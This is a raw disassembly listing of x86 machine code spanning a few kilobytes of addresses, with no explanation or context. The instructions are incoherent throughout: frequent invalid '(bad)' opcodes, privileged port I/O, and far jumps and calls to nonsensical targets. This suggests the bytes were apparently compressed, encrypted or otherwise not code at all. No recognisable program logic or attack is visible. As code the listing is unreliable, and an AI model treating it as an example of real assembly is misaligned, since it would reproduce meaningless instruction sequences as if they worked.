  418cee:	sahf   
  418cef:	xchg   DWORD PTR [ebx-0x49],esp
  418cf2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418cf3:	ins    BYTE PTR es:[edi],dx
  418cf4:	pop    ds
  418cf5:	add    eax,0x7b5fd0
  418cfa:	jno    0x418d48
  418cfc:	icebp  
  418cfd:	and    al,0x79
  418cff:	rol    BYTE PTR [edx+0x162bc127],0x52
  418d06:	push   edx
  418d07:	sub    al,0x5
  418d09:	mov    bl,0x19
  418d0b:	pop    edx
  418d0c:	xchg   ebp,eax
  418d0d:	daa    
  418d0e:	add    bh,0x2e
  418d11:	pop    es
  418d12:	push   edi
  418d13:	and    ch,BYTE PTR [ecx+0x79e2c6af]
  418d19:	ins    DWORD PTR es:[edi],dx
  418d1a:	shl    BYTE PTR [esi-0x4cd345ef],1
  418d20:	cli    
  418d21:	mov    dh,0x7b
  418d23:	pop    ecx
  418d24:	pop    DWORD PTR [eax-0xac4be0]
  418d2a:	inc    edi
  418d2b:	pop    ebp
  418d2c:	lods   al,BYTE PTR ds:[esi]
  418d2d:	sub    DWORD PTR [edx],0xffffff94
  418d30:	and    eax,0x64050f9f
  418d35:	sti    
  418d36:	sub    eax,0x8aeb7fb0
  418d3b:	push   esi
  418d3c:	call   0x2fde:0xc999bdf8
  418d43:	sub    dh,BYTE PTR [ebp+0x2082f9f7]
  418d49:	imul   eax,DWORD PTR [eax],0x4
  418d4c:	call   0xc81c:0x63e1cd69
  418d53:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  418d55:	cmp    eax,0xfffffffb
  418d58:	scas   eax,DWORD PTR es:[edi]
  418d59:	ins    DWORD PTR es:[edi],dx
  418d5a:	imul   esi,DWORD PTR [eax+ebx*1-0x5d],0xffffffd6
  418d5f:	xchg   edx,eax
  418d60:	pop    esi
  418d61:	and    eax,0xd5d58703
  418d66:	jno    0x418d13
  418d68:	or     al,0xf9
  418d6a:	add    eax,0x962c81dd
  418d6f:	aas    
  418d70:	adc    edx,ebp
  418d72:	cmp    cl,BYTE PTR [ebx-0x4906c30c]
  418d78:	adc    BYTE PTR [esi],cl
  418d7a:	movsx  esi,WORD PTR [ecx]
  418d7d:	cmc    
  418d7e:	mov    cl,0x34
  418d80:	and    ch,bl
  418d82:	mov    al,ds:0xdbeefc2f
  418d87:	mov    WORD PTR [edi-0x53],ds
  418d8a:	das    
  418d8b:	das    
  418d8c:	mov    BYTE PTR [ecx+0x2a947097],cl
  418d92:	scas   eax,DWORD PTR es:[edi]
  418d93:	push   es
  418d94:	mov    cl,0x96
  418d96:	(bad)  
  418d97:	jp     0x418d7d
  418d99:	int3   
  418d9a:	and    eax,DWORD PTR [eax-0x4500d418]
  418da0:	scas   al,BYTE PTR es:[edi]
  418da1:	cli    
  418da2:	in     al,0x7b
  418da4:	jmp    0x418d72
  418da6:	arpl   WORD PTR [edx+0x52385a0a],bp
  418dac:	inc    esi
  418dad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418dae:	xor    ch,BYTE PTR [edx+0xf220f59]
  418db4:	lock shl dh,cl
  418db7:	leave  
  418db8:	pushf  
  418db9:	cmp    eax,0x5422e31d
  418dbe:	ss cs jmp 0x2b06:0xc63e0da4
  418dc7:	out    0x77,eax
  418dc9:	push   ds
  418dca:	mov    bl,0x7f
  418dcc:	xchg   esi,eax
  418dcd:	int    0xa5
  418dcf:	mov    eax,0x2cecb53f
  418dd4:	bndstx [ebx+0x97913d5],(bad)
  418ddb:	jbe    0x418d8d
  418ddd:	push   ds
  418dde:	pop    ebp
  418ddf:	repz loopne 0x418d77
  418de2:	cli    
  418de3:	int3   
  418de4:	mov    ebx,0xa8a0dcbd
  418de9:	sbb    eax,0xf92274e7
  418dee:	loop   0x418ddc
  418df0:	shl    BYTE PTR [edx],1
  418df2:	(bad)  
  418df3:	and    al,0x8c
  418df5:	inc    edx
  418df6:	call   0x599e7c0b
  418dfb:	pusha  
  418dfc:	adc    DWORD PTR [edi-0x42],0xffffff9d
  418e00:	jmp    0x418e4d
  418e02:	ins    DWORD PTR es:[edi],dx
  418e03:	add    bh,ch
  418e05:	clc    
  418e06:	lods   al,BYTE PTR ds:[esi]
  418e07:	pushf  
  418e08:	das    
  418e09:	scas   al,BYTE PTR es:[edi]
  418e0a:	fwait
  418e0b:	sbb    BYTE PTR [ecx-0x396c8d1e],0x2e
  418e12:	xchg   edx,eax
  418e13:	nop
  418e14:	pop    esp
  418e15:	ds out 0xa1,eax
  418e18:	dec    esp
  418e19:	and    DWORD PTR [esi+0x53],edi
  418e1c:	retf   
  418e1d:	imul   edi,DWORD PTR [edi-0x3f],0xffffffd7
  418e21:	xlat   BYTE PTR ds:[ebx]
  418e22:	enter  0x2ba4,0xc7
  418e26:	(bad)  
  418e27:	addr16 pop edx
  418e29:	ficom  WORD PTR [ecx]
  418e2b:	or     ch,cl
  418e2d:	mov    eax,ds:0x95c14e59
  418e32:	dec    esp
  418e33:	idiv   cl
  418e35:	enter  0x1c9a,0x60
  418e39:	sbb    BYTE PTR [esi],al
  418e3b:	pop    ebx
  418e3c:	sti    
  418e3d:	lods   eax,DWORD PTR ds:[esi]
  418e3e:	sbb    BYTE PTR [ecx],ah
  418e40:	dec    esi
  418e41:	and    al,0x86
  418e43:	ins    DWORD PTR es:[edi],dx
  418e44:	cmp    dl,BYTE PTR [ebx-0x5b]
  418e47:	cmp    edi,DWORD PTR [ecx-0x3d]
  418e4a:	jecxz  0x418e73
  418e4c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418e4d:	lea    edx,[edi+0x1440355b]
  418e53:	test   DWORD PTR [eax+eiz*8+0x36],0x4ad6d806
  418e5b:	pop    ebp
  418e5c:	cdq    
  418e5d:	ret    
  418e5e:	mov    bl,ah
  418e60:	retf   
  418e61:	mov    cl,0x4
  418e63:	rcl    DWORD PTR [edx],1
  418e65:	(bad)  
  418e66:	adc    edi,esp
  418e68:	or     eax,0xb7289871
  418e6d:	mov    ds:0x11d4ab12,eax
  418e72:	and    eax,0xb3ad929
  418e77:	jno    0x418ef3
  418e79:	int3   
  418e7a:	sub    al,0xd9
  418e7c:	stos   DWORD PTR es:[edi],eax
  418e7d:	fwait
  418e7e:	mov    esp,0xf1612005
  418e83:	push   edx
  418e84:	lock jo 0x418e1a
  418e87:	mov    al,ds:0xb98a4c85
  418e8c:	dec    ebp
  418e8d:	pop    eax
  418e8e:	jb     0x418efe
  418e90:	jb     0x418f03
  418e92:	add    BYTE PTR es:[edx+edx*1+0x28],ch
  418e97:	sub    edx,0x75
  418e9a:	mov    ch,0xbf
  418e9c:	fiadd  WORD PTR [ebx-0x74]
  418e9f:	pop    edi
  418ea0:	scas   eax,DWORD PTR es:[edi]
  418ea1:	xor    DWORD PTR [esi],edx
  418ea3:	pop    ecx
  418ea4:	inc    ebx
  418ea5:	and    eax,0xf4b4c079
  418eaa:	adc    eax,ebp
  418eac:	aaa    
  418ead:	loop   0x418e53
  418eaf:	mov    ebx,0x3a06f43d
  418eb4:	repnz in eax,0xbf
  418eb7:	sub    ah,BYTE PTR [ecx+0x46e09b98]
  418ebd:	loopne 0x418e62
  418ebf:	clc    
  418ec0:	dec    esi
  418ec1:	retf   0x665f
  418ec4:	loopne 0x418e6a
  418ec6:	mov    ds:0x5bbdd81d,al
  418ecb:	adc    DWORD PTR [ebx-0x4],esp
  418ece:	jne    0x418e9d
  418ed0:	push   ecx
  418ed1:	sub    DWORD PTR [eax-0x5dae8bb6],edx
  418ed7:	pushf  
  418ed8:	add    bl,dl
  418eda:	sahf   
  418edb:	pop    es
  418edc:	fmul   QWORD PTR [edx]
  418ede:	out    0x9e,al
  418ee0:	stos   DWORD PTR es:[edi],eax
  418ee1:	arpl   WORD PTR [esi-0x2c],sp
  418ee4:	dec    ecx
  418ee5:	mov    esp,0x3df69dd9
  418eea:	mov    dl,0x7e
  418eec:	(bad)  
  418eed:	addr16 ss shl esi,0x1a
  418ef2:	jmp    0x5e25:0x54e17d88
  418ef9:	cli    
  418efa:	ss mov ecx,0x474ce0eb
  418f00:	rol    BYTE PTR [ebx],1
  418f02:	cmp    eax,0x2d29dcb1
  418f07:	xchg   BYTE PTR [edx-0x74343101],al
  418f0d:	xchg   edi,eax
  418f0e:	xor    BYTE PTR [edx],dl
  418f10:	jp     0x418f2c
  418f12:	adc    BYTE PTR [ecx-0x28],bh
  418f15:	pop    esp
  418f16:	push   ebp
  418f17:	fsub   QWORD PTR [ebx+0x57]
  418f1a:	pop    ss
  418f1b:	mov    DWORD PTR [ecx+0x20],esp
  418f1e:	shl    DWORD PTR [edx-0x3a],0x5
  418f22:	stos   BYTE PTR es:[edi],al
  418f23:	(bad)  
  418f25:	lahf   
  418f26:	into   
  418f27:	fwait
  418f28:	mov    esi,edi
  418f2a:	jne    0x418ed3
  418f2c:	ins    DWORD PTR es:[edi],dx
  418f2d:	or     BYTE PTR [eax+0x56],0x6b
  418f31:	cmp    eax,0x1f4f97a3
  418f36:	cmp    esp,DWORD PTR [ebp+ebx*4+0x59c4fd3f]
  418f3d:	fsubr  st(3),st
  418f3f:	aas    
  418f40:	mov    al,0x8c
  418f42:	add    bh,dl
  418f44:	std    
  418f45:	inc    esp
  418f46:	leave  
  418f47:	xchg   edi,eax
  418f48:	sahf   
  418f49:	sbb    DWORD PTR [esp+eax*4+0x1c79eb2c],edi
  418f50:	jae    0x418f9c
  418f52:	mov    WORD PTR [ebp-0x38],ds
  418f55:	fstp   TBYTE PTR [ecx-0x734a68b3]
  418f5b:	pop    ebx
  418f5c:	mov    ds:0x1ff018a3,al
  418f61:	mov    ds:0x81c94303,al
  418f66:	fiadd  DWORD PTR [eax+edx*8+0x7c]
  418f6a:	cmp    esi,DWORD PTR [eax]
  418f6c:	outs   dx,DWORD PTR ds:[esi]
  418f6d:	(bad)  
  418f6e:	mov    WORD PTR [edx-0xfc52c99],?
  418f74:	xchg   edx,eax
  418f75:	stos   DWORD PTR es:[edi],eax
  418f76:	pop    edi
  418f77:	lea    ebx,[esi-0x27]
  418f7a:	pop    ds
  418f7b:	jae    0x418f14
  418f7d:	iret   
  418f7e:	push   edx
  418f7f:	into   
  418f80:	inc    esp
  418f81:	pop    edi
  418f82:	(bad)  
  418f83:	and    eax,0xbecf1520
  418f88:	rep ins DWORD PTR es:[edi],dx
  418f8a:	sbb    al,0xf4
  418f8c:	fcmovnbe st,st(7)
  418f8e:	xchg   ebx,eax
  418f8f:	retf   0x4435
  418f92:	inc    ecx
  418f93:	lock into 
  418f95:	pushw  0x9e31
  418f99:	ror    BYTE PTR [eax+ecx*8],0xb9
  418f9d:	jmp    0x418fe5
  418f9f:	fwait
  418fa0:	idiv   BYTE PTR [ebp+0x4c]
  418fa3:	fcomi  st,st(3)
  418fa5:	sbb    eax,0x7139383b
  418faa:	dec    edi
  418fab:	adc    edi,0x49
  418fae:	imul   ebx
  418fb0:	push   es
  418fb1:	stos   BYTE PTR es:[edi],al
  418fb2:	sub    cl,BYTE PTR [ecx+0x2925f38]
  418fb8:	sub    al,0x0
  418fba:	xor    DWORD PTR [ecx-0x42],esi
  418fbd:	fisttp DWORD PTR [esi+0x5d9cf47b]
  418fc3:	jp     0x419017
  418fc5:	add    DWORD PTR [eax*4+0x3fd819c4],esp
  418fcc:	ror    BYTE PTR [edi],0xf3
  418fcf:	retf   0x687f
  418fd2:	shl    BYTE PTR [ebx-0x1d1d6d37],cl
  418fd8:	popa   
  418fd9:	cwde   
  418fda:	dec    ebx
  418fdb:	sbb    DWORD PTR [ecx+0x10075c81],0xffffffc5
  418fe2:	lock jb 0x418fc7
  418fe5:	aad    0x9c
  418fe7:	arpl   WORD PTR [esi+0x55],ax
  418fea:	xor    ebp,DWORD PTR [edi-0x3d711af5]
  418ff0:	dec    ebx
  418ff1:	shl    dh,1
  418ff3:	cmp    ch,al
  418ff5:	push   ecx
  418ff6:	test   DWORD PTR [edx+0x6274fa97],ebp
  418ffc:	push   esp
  418ffd:	push   esi
  418ffe:	(bad)  
  418fff:	in     al,dx
  419000:	not    DWORD PTR [ecx-0x53d0affd]
  419006:	fsubr  QWORD PTR [edx-0x53]
  419009:	sub    eax,0xad3c40a2
  41900e:	out    0x75,eax
  419010:	mov    ebx,0x736a6076
  419015:	sub    eax,0x4abe2db4
  41901a:	cld    
  41901b:	shr    BYTE PTR [edi-0x52],cl
  41901e:	fldcw  WORD PTR ds:0x967484e2
  419024:	dec    ebp
  419025:	imul   DWORD PTR [ebp+ebx*2+0x7b3e9d9a]
  41902c:	jmp    0x1a6b:0x464ad8b7
  419033:	aaa    
  419034:	fstp   TBYTE PTR [esi-0x7a]
  419037:	mov    BYTE PTR [esi+ebp*2-0x477ea211],al
  41903e:	fcmovbe st,st(2)
  419040:	ret    0x1fe8
  419043:	test   al,0xb4
  419045:	icebp  
  419046:	ds sti 
  419048:	sti    
  419049:	(bad)  
  41904a:	xchg   edx,eax
  41904b:	xor    dh,BYTE PTR [eax+0x60]
  41904e:	cmp    eax,DWORD PTR [ecx]
  419050:	pop    ss
  419051:	jl     0x41904f
  419053:	test   al,0xb5
  419055:	push   ds
  419056:	pop    ecx
  419057:	icebp  
  419058:	lock pop eax
  41905a:	sar    DWORD PTR [edx+eiz*8-0x1c1f8dce],cl
  419061:	aaa    
  419062:	sub    BYTE PTR [ebx],ah
  419064:	lds    ecx,FWORD PTR [eax-0x5d]
  419067:	aam    0xcb
  419069:	add    al,0xc
  41906b:	mov    edi,0xd91bb114
  419070:	es sbb ah,dl
  419073:	push   esi
  419074:	cmp    al,0x42
  419077:	lods   eax,DWORD PTR ds:[esi]
  419078:	out    0x3a,eax
  41907a:	or     DWORD PTR [ebx],esi
  41907c:	pop    ds
  41907d:	push   ds
  41907e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41907f:	sbb    BYTE PTR [ebx-0x37fe96c1],dl
  419085:	sbb    eax,0xc0dc0c05
  41908a:	outs   dx,DWORD PTR ds:[esi]
  41908b:	jb     0x4190f4
  41908d:	bound  ebp,QWORD PTR [esi-0x61]
  419090:	jae    0x4190d6
  419092:	inc    ecx
  419093:	jecxz  0x4190f0
  419095:	cs xchg ebx,eax
  419097:	stos   DWORD PTR es:[edi],eax
  419098:	pop    ecx
  419099:	xchg   edi,eax
  41909a:	jo     0x41901e
  41909c:	ret    
  41909d:	mov    bh,0x45
  41909f:	out    0x63,eax
  4190a1:	add    al,BYTE PTR [edx+0x2d]
  4190a4:	push   edi
  4190a5:	addr16 (bad) 
  4190a7:	scas   al,BYTE PTR es:[edi]
  4190a8:	sub    edi,DWORD PTR [eax]
  4190aa:	clc    
  4190ab:	xchg   ebx,eax
  4190ac:	nop
  4190ad:	aam    0xeb
  4190af:	mov    bh,BYTE PTR [ebx+0x4c]
  4190b2:	jns    0x41903c
  4190b4:	dec    esi
  4190b5:	sub    bl,BYTE PTR [esi+esi*2]
  4190b8:	cdq    
  4190b9:	daa    
  4190ba:	leave  
  4190bb:	iret   
  4190bc:	(bad)  
  4190be:	bound  edx,QWORD PTR [edx-0x37b6422b]
  4190c4:	ror    DWORD PTR [edx-0xec0df7a],cl
  4190ca:	adc    eax,0x2f34b51b
  4190cf:	mov    bl,0x29
  4190d1:	sbb    eax,0xcbebefc4
  4190d6:	mov    ds:0x6c696c28,al
  4190db:	out    0xe3,al
  4190dd:	out    0x5f,eax
  4190df:	fnsave cs:[ecx+0xf]
  4190e3:	in     al,dx
  4190e4:	and    ebp,edx
  4190e6:	scas   al,BYTE PTR es:[edi]
  4190e7:	addr16 push esi
  4190e9:	bound  ebp,QWORD PTR [eax+0x3d]
  4190ec:	fistp  DWORD PTR [edx]
  4190ee:	sub    al,0x86
  4190f0:	imul   ecx,DWORD PTR [esi+0x724fca34],0x89cce0ad
  4190fa:	stos   BYTE PTR es:[edi],al
  4190fb:	mov    bh,0x4
  4190fd:	mov    DWORD PTR [eax-0x6c],esp
  419100:	cmp    al,0xff
  419102:	and    al,0x2a
  419104:	sbb    eax,0x63bc492e
  419109:	push   ecx
  41910a:	push   0x3ae3a6a3
  41910f:	push   ss
  419110:	jmp    0x9cf4:0x88945807
  419117:	jmp    0xc696:0xce4eed02
  41911e:	mov    ss,edx
  419120:	call   0x62753906
  419125:	jmp    0x69024770
  41912a:	pop    edx
  41912b:	sub    ch,BYTE PTR [ebx+0x691b79a8]
  419131:	mov    eax,ebx
  419133:	mov    ds:0x9c5e990b,al
  419138:	dec    edx
  419139:	sub    dh,BYTE PTR [ebx]
  41913b:	cmp    eax,0xe58d8543
  419140:	mov    bh,0xfd
  419142:	inc    edi
  419143:	imul   ebx,DWORD PTR [ecx],0x69654235
  419149:	mov    al,ds:0x6caccd0a
  41914e:	shl    BYTE PTR [esi+ebx*1],1
  419151:	mov    dh,0xd7
  419153:	adc    edi,ecx
  419155:	add    bx,WORD PTR [ebx-0x7f]
  419159:	pop    edx
  41915a:	mov    ecx,0x2219d53b
  41915f:	push   ecx
  419160:	loope  0x419130
  419162:	stos   BYTE PTR es:[edi],al
  419163:	add    al,0x98
  419165:	xchg   esp,eax
  419166:	sbb    eax,0xed076bbe
  41916b:	loopne 0x4191cc
  41916d:	aas    
  41916e:	mov    esi,DWORD PTR [esi+edi*2+0x7113a97d]
  419175:	(bad)  
  419176:	popf   
  419177:	push   ds
  419178:	imul   DWORD PTR [ebx+0x74]
  41917b:	popa   
  41917c:	(bad)  [eax]
  41917e:	adc    esi,DWORD PTR [edi]
  419180:	and    BYTE PTR [esi+0x56],dl
  419183:	lock lahf 
  419185:	sbb    BYTE PTR [edx+0x0],ch
  419188:	fld    QWORD PTR ds:0x5a8d542b
  41918e:	mov    esp,0xd63ca3c0
  419193:	adc    BYTE PTR [edx],ah
  419195:	inc    ecx
  419196:	pop    ebx
  419197:	mov    edi,0xb26ef63f
  41919c:	(bad)  
  41919e:	push   es
  41919f:	rcl    BYTE PTR [ecx],1
  4191a1:	out    dx,eax
  4191a2:	pop    ebx
  4191a3:	adc    eax,0xdfd1bd25
  4191a8:	repz xlat BYTE PTR ds:[ebx]
  4191aa:	or     al,BYTE PTR [ecx+0x1b58c39e]
  4191b0:	push   0xdbb92894
  4191b5:	setg   BYTE PTR [eax+0x2a4200ba]
  4191bc:	inc    ebp
  4191bd:	rol    ebx,0xf7
  4191c0:	clc    
  4191c1:	pop    ebp
  4191c2:	jle    0x41914a
  4191c4:	test   bh,bh
  4191c6:	in     al,dx
  4191c7:	loope  0x4191ef
  4191c9:	in     al,dx
  4191ca:	ss leave 
  4191cc:	sbb    BYTE PTR [esi+ebx*2],0xef
  4191d0:	adc    edx,DWORD PTR [esi-0x55]
  4191d3:	je     0x419193
  4191d5:	pop    ds
  4191d6:	jmp    0xba9c:0xf15c3231
  4191dd:	icebp  
  4191de:	lahf   
  4191df:	mov    ecx,0x423f50f7
  4191e4:	(bad)  
  4191e7:	jg     0x4191fc
  4191e9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4191ea:	inc    ecx
  4191eb:	fcom   st(6)
  4191ed:	xchg   edi,eax
  4191ee:	pop    eax
  4191ef:	aad    0xc
  4191f1:	rcr    BYTE PTR [ebx],cl
  4191f3:	mov    ds:0xfa381a2c,eax
  4191f8:	add    al,0xbe
  4191fa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4191fb:	sbb    eax,0x71ae8878
  419200:	ret    
  419201:	jb     0x41919d
  419203:	xchg   esp,eax
  419204:	xchg   ebx,eax
  419205:	outs   dx,BYTE PTR ds:[esi]
  419206:	or     eax,0x3ae66136
  41920b:	sbb    eax,0x14d6b388
  419210:	ficom  DWORD PTR [eax+edx*2-0x74e3763]
  419217:	arpl   WORD PTR [ebx-0x27],sp
  41921a:	jne    0xe699057c
  419220:	add    al,0x63
  419222:	les    esp,FWORD PTR [eax]
  419224:	inc    ebp
  419225:	or     bl,BYTE PTR [edx-0x43]
  419228:	aad    0xc6
  41922a:	dec    esi
  41922b:	and    BYTE PTR [edi-0x38830ff8],ah
  419231:	adc    BYTE PTR [ecx-0x3eb36182],dh
  419237:	div    BYTE PTR [ebx]
  419239:	adc    al,0x2e
  41923b:	lods   al,BYTE PTR ds:[esi]
  41923c:	sbb    BYTE PTR [ecx-0x15],0x7c
  419240:	and    cl,BYTE PTR [bp+0x55a1]
  419245:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419246:	pop    esi
  419247:	fcom   st(4)
  419249:	mov    ah,0xe
  41924b:	sbb    eax,0xd499e4b1
  419250:	(bad)  
  419251:	mov    ch,al
  419253:	idiv   BYTE PTR ds:0xcc64d8f6
  419259:	pop    esp
  41925a:	int3   
  41925b:	mov    cl,0xaf
  41925d:	push   0x7c
  41925f:	test   dl,al
  419261:	or     al,BYTE PTR [ecx+ebx*2]
  419264:	jmp    0x9a07:0x785f7ffe
  41926b:	ret    
  41926c:	mov    al,ds:0xca9428ff
  419271:	and    DWORD PTR [eax+0x13],edi
  419274:	dec    esi
  419275:	clc    
  419276:	xor    DWORD PTR [ecx+ebx*4-0x520ebec7],0xa12234da
  419281:	enter  0xc2e7,0x97
  419285:	mov    ecx,0x8b7ee786
  41928a:	xor    DWORD PTR [eax-0x372d85c4],edi
  419290:	mov    eax,ds:0x686cbb64
  419295:	mov    bh,0x71
  419297:	mov    ecx,0x163ae121
  41929c:	jg     0x4192f4
  41929e:	xlat   BYTE PTR ds:[ebx]
  41929f:	inc    esp
  4192a0:	pop    ebp
  4192a1:	jmp    0x41929b
  4192a3:	push   es
  4192a4:	mov    dl,0x64
  4192a6:	push   ebp
  4192a7:	and    cl,BYTE PTR [ebp-0x7cbf9b9c]
  4192ad:	(bad)  
  4192ae:	loop   0x4192a8
  4192b0:	cmp    DWORD PTR [edx+0x7c],0xa72d46ab
  4192b7:	xchg   ebx,eax
  4192b8:	scas   al,BYTE PTR es:[edi]
  4192b9:	mov    ds:0x17e1ef75,al
  4192be:	(bad)
  4192c2:	dec    esp
  4192c3:	test   BYTE PTR [ebp-0x5e],al
  4192c6:	loopne 0x4192a1
  4192c8:	in     al,dx
  4192c9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4192ca:	mov    dh,0x38
  4192cc:	jb     0x419316
  4192ce:	stos   BYTE PTR es:[edi],al
  4192cf:	loop   0x4192d7
  4192d1:	test   BYTE PTR [edi],0x5f
  4192d4:	pop    ecx
  4192d5:	mov    ah,0x62
  4192d7:	inc    edx
  4192d8:	bound  esi,QWORD PTR [esi]
  4192da:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4192db:	test   BYTE PTR [ebx+0x58374084],dh
  4192e1:	enter  0xcdb8,0x75
  4192e5:	mov    esi,0x464fb733
  4192ea:	aas    
  4192eb:	mov    edi,0x4017a61c
  4192f0:	sub    ch,bh
  4192f2:	inc    edx
  4192f3:	adc    eax,DWORD PTR [esi-0x3e]
  4192f6:	test   al,0xa4
  4192f8:	fisubr DWORD PTR [edi+0x60]
  4192fb:	push   ss
  4192fc:	into   
  4192fd:	sbb    BYTE PTR [ecx],0xb1
  419300:	movups xmm5,XMMWORD PTR cs:[ebx+0x72039921]
  419308:	cmc    
  419309:	sub    cl,BYTE PTR [edx+esi*2]
  41930c:	xor    al,0x84
  41930e:	push   ds
  41930f:	pushf  
  419310:	mul    DWORD PTR [ebx]
  419312:	loop   0x419367
  419314:	mov    ebx,0xfb730194
  419319:	mov    dl,0x9d
  41931b:	inc    edi
  41931c:	cmc    
  41931d:	ds repnz xor al,0x6b
  419321:	scas   al,BYTE PTR es:[edi]
  419322:	xchg   BYTE PTR [edx-0x58],bh
  419325:	sub    al,0x29
  419327:	push   es
  419328:	test   bh,bh
  41932a:	pop    ecx
  41932b:	sub    BYTE PTR [ebx+0x4bcc5b8f],dh
  419331:	div    BYTE PTR [edi+0x40bd3a8]
  419337:	aaa    
  419338:	inc    edx
  419339:	mov    ebx,0xaab6c233
  41933e:	add    cl,BYTE PTR [edx-0xa]
  419341:	(bad)  
  419342:	push   ecx
  419344:	jnp    0xbcfff632
  41934a:	jp     0x41931e
  41934c:	ins    DWORD PTR es:[edi],dx
  41934d:	outs   dx,BYTE PTR ds:[esi]
  41934e:	push   edx
  41934f:	and    al,0x27
  419351:	add    dh,BYTE PTR [esi-0xca51cc8]
  419357:	lock mul BYTE PTR [ebx]
  41935a:	push   ebx
  41935b:	fistp  DWORD PTR [ecx+eiz*4+0x75ee77ef]
  419362:	add    DWORD PTR [eax+0x339608e],edi
  419368:	hlt    
  419369:	pop    edi
  41936a:	mov    WORD PTR [ecx+0x66],ds
  41936d:	fistp  QWORD PTR [esi]
  41936f:	and    DWORD PTR [eax+0x352544d1],0xffffff8e
  419376:	ds push 0xffffff94
  419379:	adc    eax,0x3e5e0ce9
  41937e:	cmp    eax,DWORD PTR [ebx+eiz*2-0x5c]
  419382:	ret    0x1633
  419385:	xchg   ebx,eax
  419386:	(bad)  
  419387:	jp     0x41931e
  419389:	shl    BYTE PTR [esp+eax*4-0x314fb23d],cl
  419390:	mov    ebp,0x28c90630
  419395:	mov    ch,0x54
  419397:	jae    0x4193eb
  419399:	lods   eax,DWORD PTR ds:[esi]
  41939a:	inc    ecx
  41939b:	imul   edx,DWORD PTR cs:[edi+0x59b14b72],0xffffffa4
  4193a3:	dec    edi
  4193a4:	xchg   ecx,eax
  4193a5:	adc    al,0x9f
  4193a7:	cdq    
  4193a8:	inc    esi
  4193a9:	dec    ebp
  4193aa:	jp     0x419397
  4193ac:	or     ebx,DWORD PTR [esi+0x42]
  4193af:	stos   BYTE PTR es:[edi],al
  4193b0:	shr    BYTE PTR [ecx+0x71],cl
  4193b3:	mov    bh,0xb2
  4193b5:	outs   dx,BYTE PTR ds:[esi]
  4193b6:	jge    0x41941d
  4193b8:	jmp    0x39280b2d
  4193bd:	inc    ebx
  4193be:	icebp  
  4193bf:	dec    ebx
  4193c0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4193c1:	cld    
  4193c2:	stos   BYTE PTR es:[edi],al
  4193c3:	mov    eax,0x284a3fc1
  4193c8:	xcrypt-ctr (bad)
  4193c9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4193ca:	pop    ecx
  4193cb:	fisttp QWORD PTR [edi-0x7e]
  4193ce:	jns    0x4193fc
  4193d0:	or     ecx,DWORD PTR [eax+0x3a0e97]
  4193d6:	sbb    eax,edi
  4193d8:	enter  0x3237,0x8f
  4193dc:	das    
  4193dd:	imul   edi,DWORD PTR [eax],0x8ce43fd6
  4193e3:	inc    ebp
  4193e4:	int3   
  4193e5:	out    0x18,eax
  4193e7:	mov    edx,cs
  4193e9:	jecxz  0x4193ad
  4193eb:	mov    dh,0xa2
  4193ed:	fld    TBYTE PTR [ebx-0x5b2be2ab]
  4193f3:	pop    edx
  4193f4:	mov    eax,cs
  4193f6:	pushf  
  4193f7:	sub    al,0x7e
  4193f9:	je     0x41946c
  4193fb:	les    eax,FWORD PTR [edx+0x6bc83c4d]
  419401:	inc    ebx
  419402:	cmp    BYTE PTR [bx+si+0x30b],cl
  419407:	scas   al,BYTE PTR es:[edi]
  419408:	cmp    BYTE PTR [ecx+0x9],bh
  41940b:	ds pop ss
  41940d:	mov    dl,0xac
  41940f:	rcl    DWORD PTR [edx-0x20a3bbf6],0x1d
  419416:	dec    esp
  419417:	mov    WORD PTR [ecx+0x582c7339],gs
  41941d:	out    dx,eax
  41941e:	and    DWORD PTR ss:[edx+0xf],0x60
  419423:	pop    es
  419424:	outs   dx,DWORD PTR ds:[esi]
  419425:	dec    eax
  419426:	out    dx,eax
  419427:	jne    0x41949c
  419429:	inc    edi
  41942a:	cli    
  41942b:	or     al,0x32
  41942d:	cmc    
  41942e:	inc    edx
  41942f:	mov    dh,0xf
  419431:	mov    WORD PTR [esi-0x7e],fs
  419434:	xchg   esi,eax
  419435:	aas    
  419436:	jbe    0x4193bb
  419438:	sbb    eax,eax
  41943a:	pop    ds
  41943b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41943c:	test   eax,0xded12674
  419441:	adc    bl,BYTE PTR [edx]
  419443:	fsub   DWORD PTR [eax+edi*2-0x1c12eede]
  41944a:	dec    eax
  41944b:	and    eax,0x54888897
  419450:	push   es
  419451:	inc    edi
  419452:	jecxz  0x419488
  419454:	pop    ds
  419455:	mov    bl,0xcf
  419457:	retf   
  419458:	aas    
  419459:	popf   
  41945a:	ds jge 0x41949f
  41945d:	jae    0x41946b
  41945f:	xor    eax,0xf6dd778a
  419464:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419465:	pop    ebx
  419466:	sbb    edi,DWORD PTR [edx+0x24]
  419469:	leave  
  41946a:	out    dx,al
  41946b:	fcmovne st,st(5)
  41946d:	neg    DWORD PTR [ebx-0x7e]
  419470:	(bad)  
  419471:	jecxz  0x4194f1
  419473:	xor    al,0xa1
  419475:	xchg   bh,ch
  419477:	jge    0x4194d6
  419479:	sub    edi,ebp
  41947b:	dec    ebp
  41947c:	sbb    DWORD PTR [ebp+edi*1+0x7d3ec21f],ebx
  419483:	xor    DWORD PTR [ebp-0x429e2faf],ecx
  419489:	jno    0x4194d1
  41948b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41948c:	mov    cl,0x75
  41948e:	repnz sbb edx,DWORD PTR [esi]
  419491:	retf   0xf2fa
  419494:	icebp  
  419495:	dec    ebx
  419496:	or     BYTE PTR [bx+si],bh
  419499:	test   eax,0xd8fb67d4
  41949e:	sub    dl,BYTE PTR [esi+0x42]
  4194a1:	test   DWORD PTR [ecx+0x73e12734],0xfb78c387
  4194ab:	ds and bl,bl
  4194ae:	call   0x37c2fd97
